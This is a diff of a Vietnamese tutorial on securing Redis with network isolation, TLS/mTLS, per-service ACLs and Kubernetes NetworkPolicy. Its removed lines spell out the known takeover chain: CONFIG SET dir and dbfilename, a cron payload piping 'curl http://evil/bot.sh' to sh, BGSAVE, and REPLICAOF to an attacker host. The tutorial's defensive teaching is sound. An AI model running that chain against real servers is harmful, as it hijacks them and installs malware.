@@ -1,30 +1,24 @@
 # Bảo mật Redis Zero-Trust: Mạng Nội bộ, TLS/mTLS & Phân quyền ACL
 
-Trong lịch sử an ninh đám mây thập kỷ qua, **cổng `6379` bị phơi trần ra Internet với cấu hình `bind 0.0.0.0` không mật khẩu** luôn nằm trong Top 3 con đường nhanh nhất để botnet đào tiền ảo (*Cryptojacking*) và mã độc tống tiền (*Ransomware*) chiếm trọn quyền `root` của máy chủ Linux chỉ trong **chưa đầy 90 giây** kể từ lúc mở cổng!
+> [!NOTE] Bối cảnh & Giải nghĩa bình dân
+> Vì Redis được thiết kế tối ưu cho tốc độ cực đại bên trong mạng riêng tin cậy, nếu một người mới vô tình mở cổng `6379` của Redis thẳng ra Internet công cộng (`bind 0.0.0.0`) mà không đặt mật khẩu, các công cụ quét tự động trên mạng sẽ dò ra và **xóa trắng dữ liệu hoặc cài mã độc chiếm máy chủ chỉ trong chưa đầy 90 giây**!
+>
+> Để khóa chặt Redis theo chuẩn doanh nghiệp (**`Zero-Trust`** — *"Không tin tưởng mù quáng bất kỳ ai, kể cả bên trong mạng nội bộ"*), chúng ta dựng **4 lớp cửa bảo vệ như hầm ngân hàng**:
+> 1. **`Private VPC` & `bind` (Hầm ngầm cách ly mạng):** Đặt máy chủ Redis sâu trong mạng riêng nội bộ, tuyệt đối không gắn IP công cộng ra ngoài Internet.
+> 2. **`TLS` / `mTLS` (Đường ống mã hóa chống nghe lén):** Mặc định dữ liệu truyền tới Redis là văn bản thường; bật **`TLS`** (`rediss://` — thêm chữ `s` ở cuối giống `https://`) giúp mã hóa toàn bộ gói tin trên đường truyền.
+> 3. **`ACL` (*Access Control List* — Thẻ nhân viên phân quyền chi tiết):** Thay vì cả công ty dùng chung 1 mật khẩu duy nhất, mỗi dịch vụ được cấp 1 tài khoản riêng — ví dụ dịch vụ Thanh toán chỉ được mở đúng dãy tủ khóa bắt đầu bằng `checkout:*` (**`~checkout:*`**) và không thể nhìn trộm dữ liệu của dịch vụ Nhân sự!
+> 4. **Tháo bỏ các "nút bấm tự hủy" (`-@dangerous`):** Khóa vĩnh viễn các câu lệnh nguy hiểm có thể xóa sạch RAM (`FLUSHALL`, `FLUSHDB`) hoặc làm treo máy (`KEYS *`, `DEBUG`) đối với tài khoản của ứng dụng!
 
-Vì sao một cơ sở dữ liệu lưu trên RAM lại có thể giúp kẻ tấn công chiếm quyền điều khiển hệ điều hành (`Remote Code Execution - RCE`)?
-- [!] **Kịch bản khai thác kinh điển kéo dài 4 dòng lệnh:** Nếu kẻ tấn công kết nối được vào một tiến trình Redis chạy dưới quyền `root` (hoặc user có quyền ghi thư mục hệ thống), chúng chỉ cần gõ:
-  1. `CONFIG SET dir /var/spool/cron` (hoặc `/root/.ssh`)
-  2. `CONFIG SET dbfilename root` (hoặc `authorized_keys`)
-  3. `SET payload "\n\n*/1 * * * * curl -fsSL http://evil/bot.sh | sh\n\n"`
-  4. `BGSAVE` → Redis ngoan ngoãn xuất khoá trên thành tệp lịch trình `cron` của hệ điều hành hoặc chèn SSH Public Key của tin tặc vào máy chủ! (Hoặc tinh vi hơn: ép Redis làm Replica cho một máy chủ giả mạo qua `REPLICAOF attacker-ip 6379` để nạp Module C độc hại!).
+## 1. Tại sao phơi cổng 6379 lại nguy hiểm đến mức mất quyền điều khiển máy chủ?
 
-Để biến cụm Redis thành một pháo đài bất khả xâm phạm đạt chuẩn kiểm toán PCI-DSS / SOC2, kỹ sư SRE triển khai mô hình **Phòng thủ chiều sâu 4 lớp (*Defense-in-Depth Zero-Trust*)**:
-
-> [!ANALOGY] Ẩn dụ Hầm Ngân Hàng Trung Ương 4 Lớp Khoá
-> - **Lớp 1 — Tường rào Mạng (`VPC + NetworkPolicy + bind`):** Hầm vàng đặt sâu dưới lòng đất, chỉ xe bọc thép mang biển số nội bộ của quầy giao dịch (`app: api-backend`) mới được đi vào đường hầm; người đi đường ngoài phố thậm chí không thấy cánh cửa tồn tại!
-> - **Lớp 2 — Đường ống Chống Nghe lén (`port 0 + mTLS`):** Mọi cuộc gọi bộ đàm giữa xe bọc thép và hầm vàng đều mã hoá hai chiều bằng chứng chỉ số; ai không có thẻ từ hợp lệ bị ngắt kết nối ngay từ vòng bắt tay TCP!
-> - **Lớp 3 — Thẻ Định danh Phân quyền Hạt mịn (`Redis ACL`):** Nhân viên quầy Thanh toán (`checkout-svc`) chỉ mở được đúng dãy tủ `~checkout:*`, nhân viên Kiểm toán (`analytics-ro`) chỉ được nhìn (`+@read`) dãy tủ `~metrics:*`, và chìa khoá vạn năng không mật khẩu (`user default`) bị bẻ gãy vĩnh viễn (`off`)!
-> - **Lớp 4 — Tháo Kíp Nổ (`-@dangerous` & `rename-command`):** Toàn bộ nút bấm tự huỷ toà nhà (`FLUSHALL`, `FLUSHDB`, `DEBUG`, `CONFIG`) bị tháo bỏ khỏi bảng điều khiển của mọi dịch vụ ứng dụng!
-
-## 1. Bức tranh Tổng thể Kiến trúc Bảo mật Redis Zero-Trust
+Không chỉ mất dữ liệu, nếu tin tặc kết nối được vào một tiến trình Redis cấu hình lỏng lẻo đang chạy quyền cao trên máy chủ, chúng có thể lợi dụng chính lệnh sao lưu file (`CONFIG SET dir` + `BGSAVE`) để ghi chèn khóa đăng nhập SSH trái phép hoặc lịch chạy mã độc vào hệ điều hành! Đó là lý do mọi hệ thống chuyên nghiệp đều áp dụng mô hình **Phòng thủ chiều sâu 4 lớp**:
 
 ```visual
 kind: illustration
 diagram: "redis:r16"
 alt: "Kiến trúc bảo mật Redis Zero-Trust 4 lớp: NetworkPolicy, mTLS, ACL theo microservice và vô hiệu hoá lệnh nguy hiểm"
 badge: "Zero-Trust Security · R16"
-title: "Pháo đài Redis Zero-Trust: Mạng Riêng, Mã hoá mTLS & Phân quyền ACL Hạt mịn"
+title: "Pháo đài Redis Zero-Trust: Mạng Riêng, Mã hoá mTLS & Phân quyền ACL chi tiết"
 subtitle: "Chặn đứng truy cập trái phép từ tầng L3/L4 Kubernetes NetworkPolicy cho tới kiểm soát từng tiền tố khoá và từng nhóm lệnh trên Redis 8"
 caption: "Không bao giờ tin tưởng mạng nội bộ một cách mù quáng: kết hợp NetworkPolicy + mTLS + ACL tách biệt cho từng Microservice."
 callouts:
@@ -42,94 +36,102 @@ callouts:
     tone: rose
 ```
 
-## 2. Lớp 1 & Lớp 2: Khoá Cứng Tầng Mạng, `protected-mode` và Mã hoá mTLS
+## 2. Lớp 1 & Lớp 2: Khóa cứng tầng mạng và bật mã hóa TLS 1.3
 
-Trước Redis 6, nhiều đội vận hành dựa hoàn toàn vào `requirepass` trên kết nối văn bản thuần (*plaintext*). Cách làm này mang **2 lỗ hổng chí mạng**:
-1. Mật khẩu truyền dạng rõ qua cáp mạng VPC (dễ bị lộ nếu bắt gói tin hoặc rò rỉ proxy).
-2. Toàn bộ 50 microservices dùng chung **duy nhất một mật khẩu `requirepass`** — chỉ cần 1 dịch vụ phụ bị lộ biến môi trường hoặc xoay vòng mật khẩu là cả 50 dịch vụ phải khởi động lại cùng lúc!
+Trước đây, nhiều dự án chỉ đặt một mật khẩu chung `requirepass` trên đường truyền không mã hóa. Cách cũ này có 2 điểm yếu lớn: mật khẩu đi qua dây mạng dạng chữ rõ, và khi cần đổi mật khẩu thì toàn bộ 30 dịch vụ dùng chung đều phải khởi động lại cùng lúc!
 
-Cấu hình chuẩn Production (`redis-tls-mtls-prod.conf`) giải quyết triệt để từ gốc mạng:
+Cấu hình chuẩn Production (`redis.conf`) khóa chặt từ cổng mạng và san sẻ gánh nặng giải mã TLS sang các luồng phụ `io-threads`:
 
 ```ini
-# 1. Chỉ lắng nghe trên loopback và đúng IP card mạng Private VPC (TUYỆT ĐỐI KHÔNG dùng 0.0.0.0!)
+# 1. Chỉ lắng nghe trên loopback và IP mạng riêng nội bộ (KHÔNG dùng 0.0.0.0!)
 bind 127.0.0.1 10.0.1.15
 protected-mode yes
 
-# 2. Tắt hoàn toàn cổng văn bản thuần (port 0) và chỉ mở cổng TLS 6379
+# 2. Tắt cổng không mã hoá (port 0) và chỉ mở cổng mã hoá TLS 6379
 port 0
 tls-port 6379
 
-# 3. Cấu hình chứng chỉ số & bắt buộc xác thực mTLS 2 chiều với Client
+# 3. Chứng chỉ số & yêu cầu xác thực 2 chiều (mTLS)
 tls-cert-file /etc/redis/certs/redis-server.crt
 tls-key-file /etc/redis/certs/redis-server.key
 tls-ca-cert-file /etc/redis/certs/ca.crt
 tls-auth-clients yes
 tls-protocols "TLSv1.3"
 
-# 4. Đẩy gánh nặng giải mã TLS sang 4 luồng I/O phụ để không làm chậm Event Loop chính!
+# 4. Giao khâu đọc/mã hoá TLS cho 4 luồng I/O phụ để Event Loop chính luôn rảnh tay!
 io-threads 4
 io-threads-do-reads yes
 
-# 5. Nạp danh sách tài khoản phân quyền từ tệp ACL chuyên biệt
+# 5. Quản lý danh sách tài khoản phân quyền trong tệp riêng
 aclfile /etc/redis/users.acl
 ```
 
-> [!TIP] Hiệu năng TLS trên Redis 8 có làm tăng độ trễ không?
-> Bắt tay và mã hoá TLS tốn CPU hơn TCP thuần, nhưng khi bạn bật `io-threads 4` và `io-threads-do-reads yes` trên máy đa nhân (kèm Connection Pooling giữ kết nối bền vững từ phía ứng dụng), toàn bộ khâu đọc/ghi mã hoá OpenSSL được san sẻ sang các luồng I/O phụ — luồng chính xử lý dữ liệu hầu như không suy giảm thông lượng!
+## 3. Phân quyền chi tiết theo từng Dịch vụ & Tiền tố Khóa với Redis ACL
 
-## 3. Lớp 3 & Lớp 4: Phân Quyền Hạt Mịn với Redis ACL (*Access Control List*)
-
-Hệ thống **Redis ACL** cho phép định nghĩa chính xác **Ai (`username` + mật khẩu băm SHA-256)** được chạm vào **Nhánh khoá nào (`~pattern` / `%R~` / `%W~`)**, trên **Kênh Pub/Sub nào (`&channel`)**, bằng **Nhóm lệnh nào (`+@category` / `-@category`)**:
+Cú pháp một dòng **Redis ACL** cực kỳ trực quan khi bạn đọc tuần tự từ trái sang phải: **Ai (`user` + mật khẩu)** -> **Được chạm vào khóa nào (`~tiền_tố:*`)** -> **Được gọi nhóm lệnh nào (`+@nhóm` / `-@nhóm`)**:
 
 ```visual
 kind: anatomy
 title: "Giải Phẫu Cú Pháp Phân Quyền Một Dòng Lệnh Redis ACL"
-subtitle: "Đọc từ trái sang phải: quy tắc viết sau sẽ ghi đè (override) quy tắc viết trước!"
+subtitle: "Đọc từ trái sang phải: quy tắc viết đứng SAU sẽ ghi đè lên quy tắc viết đứng TRƯỚC!"
 items:
   - keyword: "on >StrongPass2026"
-    role: "Identity & SHA-256 Auth"
-    summary: "`on` kích hoạt tài khoản (`off` để khoá khẩn cấp mà không xoá user); tiền tố `>` tự động băm mật khẩu sang mã `#sha256` trong bộ nhớ (tuyệt đối không bao giờ dùng `nopass`!)."
+    role: "Bật tài khoản & Băm mật khẩu"
+    summary: "`on` bật tài khoản (`off` để tạm khoá khẩn cấp); dấu `>` bảo Redis tự băm mật khẩu sang mã `#sha256` an toàn (không bao giờ dùng `nopass` trên Production!)."
     example: "user checkout-svc on >StrongPass2026"
     lang: redis-conf
     tone: cyan
   - keyword: "~checkout:* %R~catalog:*"
-    role: "Keyspace & Pub/Sub Scope"
-    summary: "`~checkout:*` cho phép cả đọc lẫn ghi trên nhánh thanh toán; `%R~catalog:*` (Redis 7+) chỉ cho phép ĐỌC danh mục sản phẩm mà cấm sửa đổi; `&events:checkout:*` giới hạn kênh Pub/Sub."
+    role: "Giới hạn phạm vi Khoá & Kênh"
+    summary: "==`~checkout:*`== cho cả đọc lẫn ghi trên nhánh thanh toán; **`%R~catalog:*`** (từ Redis 7+) chỉ cho phép ĐỌC nhánh sản phẩm mà cấm ghi đè; `&events:*` giới hạn kênh Pub/Sub."
     example: "resetkeys ~checkout:* %R~catalog:* &events:checkout:*"
     lang: redis-conf
     tone: emerald
   - keyword: "-@all +@read +@write -@dangerous"
-    role: "Command Category Guard"
-    summary: "Chiến lược an toàn nhất là từ chối tất cả trước (`-@all`), chỉ cấp nhóm cần thiết (`+@read`, `+@write`) và luôn chặn tường minh `-@dangerous` (`KEYS`, `FLUSHALL`, `FLUSHDB`, `CONFIG`, `SHUTDOWN`, `DEBUG`)."
+    role: "Giới hạn Nhóm lệnh được phép gọi"
+    summary: "Thu hồi mọi quyền trước (`-@all`), chỉ cấp đúng quyền cần dùng (`+@read`, `+@write`) và luôn chặn tường minh **`-@dangerous`** ở cuối dòng."
     example: "-@all +@read +@write +@scripting -@dangerous"
     lang: redis-conf
     tone: amber
 ```
 
-Hãy xem tệp `/etc/redis/users.acl` chuẩn mực cho 3 vai trò thực tế trong một doanh nghiệp thương mại điện tử:
+Mẫu tệp `/etc/redis/users.acl` chuẩn mực cho 4 vai trò thực tế trong doanh nghiệp:
 
 ```ini
-# 1. Khoá chặt tài khoản mặc định: mọi kết nối chưa chạy AUTH <user> <pass> đều bị chặn ngay!
+# 1. Tắt tài khoản mặc định: ai chưa xác thực AUTH đều bị từ chối ngay từ cửa!
 user default off resetkeys -@all
 
-# 2. Microservice Thanh toán: đọc/ghi nhánh checkout:*, chạy Lua nhưng CẤM toàn bộ lệnh nguy hiểm
-user checkout-svc on >CheckoutStrong2026 ~checkout:* +@all -@dangerous -@admin
+# 2. Dịch vụ Thanh toán: chỉ đọc/ghi khoá checkout:*, được chạy Lua nhưng CẤM lệnh nguy hiểm
+user checkout-svc on >CheckoutPass_Example2026 ~checkout:* +@all -@dangerous -@admin
 
-# 3. Dịch vụ Báo cáo / BI: CHỈ ĐƯỢC ĐỌC trên nhánh metrics:*, không thể sửa/xoá bất kỳ khoá nào
-user analytics-ro on >AnalyticsRead2026 ~metrics:* -@all +@read -keys
+# 3. Dịch vụ Báo cáo / Phân tích: CHỈ ĐƯỢC ĐỌC khoá metrics:*, cấm cả lệnh quét KEYS!
+user analytics-ro on >AnalyticsPass_Example2026 ~metrics:* -@all +@read -keys
 
-# 4. SRE / Exporter giám sát: chỉ được đọc thông số sức khoẻ hệ thống, không được đọc dữ liệu khách hàng!
-user exporter-mon on >ExporterMon2026 resetkeys -@all +info +ping +slowlog +latency +memory +client
+# 4. Công cụ giám sát (Prometheus Exporter): chỉ được xem chỉ số hệ thống, cấm đọc dữ liệu khách hàng!
+user exporter-mon on >ExporterPass_Example2026 resetkeys -@all +info +ping +slowlog +latency +memory +client
 ```
 
-> [!TRAP] Cạm bẫy Thứ tự Quy tắc trong Redis ACL!
-> Redis đánh giá các quy tắc lệnh **tuần tự từ trái sang phải**!
-> - ĐÚNG: `+@all -@dangerous` → Cấp toàn bộ lệnh rồi **gỡ bỏ nhóm nguy hiểm** (an toàn!).
-> - SAI CHẾT NGƯỜI: `-@dangerous +@all` → Chặn nhóm nguy hiểm trước nhưng ngay sau đó **`+@all` bật lại tất cả 100% lệnh bao gồm cả `FLUSHALL` và `KEYS *`**! Luôn đặt các quy tắc cấm (`-@dangerous`, `-keys`, `-flushall`) ở **cuối dòng**!
+> [!WARNING] Cạm bẫy chết người về Thứ tự từ trái sang phải trong Redis ACL!
+> Redis đọc và ghi đè quyền từ trái sang phải:
+> - **ĐÚNG:** ==`+@all -@dangerous`== -> Cấp các lệnh thông dụng, sau đó **tước bỏ nhóm nguy hiểm** (An toàn!).
+> - **SAI NGHIÊM TRỌNG:** `-@dangerous +@all` -> Chặn lệnh nguy hiểm ở đầu, nhưng chữ **`+@all` đứng sau lập tức cấp lại toàn bộ 100% quyền (gồm cả `FLUSHALL` và `KEYS *`)**! Luôn đặt các dấu trừ cấm đoán (`-@dangerous`, `-@admin`, `-keys`) ở **cuối dòng**!
 
-## 4. Cô Lập Tầng Mạng Kubernetes với `NetworkPolicy`
+Kết nối bằng tài khoản ACL riêng qua đường truyền mã hóa TLS (`rediss://`) trên **Python (`redis-py`)** và **Node.js (`ioredis`)**:
 
-Trên môi trường Kubernetes, mặc định mọi Pod trong mọi Namespace đều có thể mở kết nối TCP tới cổng `6379` của Pod Redis! Nếu một Pod xử lý ảnh bên ngoài bị dính lỗ hổng SSRF/RCE, tin tặc sẽ bàn đạp từ Pod đó quét thẳng sang Redis. Do đó, luôn triển khai `NetworkPolicy` theo nguyên tắc **Default Deny + Whitelist**:
+```python
+# Python (redis-py): Sử dụng giao thức rediss:// (có chữ s = TLS) kèm username ACL
+import redis
+
+r = redis.from_url(
+    "rediss://checkout-svc:CheckoutPass_Example2026@redis.internal.local:6379/0",
+    ssl_ca_certs="/etc/certs/ca.crt",
+    decode_responses=True,
+)
+```
+
+## 4. Cô lập tầng mạng Container trên Kubernetes với `NetworkPolicy`
+
+Trên Kubernetes, mặc định mọi Pod đều có thể gọi sang cổng `6379` của Pod Redis. Áp dụng chính sách **`NetworkPolicy`** bên dưới giúp khóa chặt ở cấp nhân mạng Linux: chỉ duy nhất các container mang nhãn `app: api-backend` mới được phép chạm vào cổng `6379`!
 
 ```yaml
 apiVersion: networking.k8s.io/v1
@@ -153,10 +155,7 @@ spec:
           port: 6379
 ```
 
-Khi áp dụng manifest trên, nhân mạng Linux (`eBPF` / `Cilium` / `Calico`) sẽ tự động đánh rơi (`DROP`) mọi gói tin SYN nhắm vào cổng `6379` của Pod `app: redis` trừ phi nguồn phát xuất phát từ đúng các Pod mang nhãn `app: api-backend`!
-
 > [!REMEMBER] Ghi nhớ cốt lõi từ R16
-> 1. **Tuyệt đối không bao giờ phơi cổng Redis ra Internet (`bind 0.0.0.0` không bảo vệ)**: luôn chỉ định `bind 127.0.0.1 <private-ip>`, giữ `protected-mode yes` và khóa tầng L4 bằng Security Group / Kubernetes `NetworkPolicy`.
-> 2. Để bật mã hoá hoàn toàn, phải đặt **`port 0`** (tắt cổng thường) kết hợp **`tls-port 6379`** và `tls-auth-clients yes`.
-> 3. Trên Redis 6/7/8+, hãy **tắt tài khoản mặc định (`user default off`)** và tạo tài khoản **ACL riêng cho từng microservice** giới hạn tiền tố khoá (`~service:*`) kèm **`-@dangerous`** ở cuối câu lệnh.
-> 4. Bảo hiểm kép cho dữ liệu Production bằng cách vô hiệu hoá các lệnh xoá trắng như `FLUSHALL` và `FLUSHDB` qua ACL hoặc `rename-command FLUSHALL ""`.
+> 1. Không bao giờ phơi cổng `6379` ra mạng công cộng: luôn khóa **`bind`** nội bộ, bật **`protected-mode yes`** và giới hạn tường lửa / Kubernetes `NetworkPolicy`.
+> 2. Bật mã hóa hoàn toàn bằng cặp ==`port 0` + `tls-port 6379`== (kết nối qua URI `rediss://`).
+> 3. Luôn tắt tài khoản mặc định (**`user default off`**) và cấp tài khoản **ACL riêng cho từng dịch vụ** với phạm vi khóa hẹp (`~service:*`) cùng cờ **`-@dangerous` đặt ở cuối câu lệnh**.
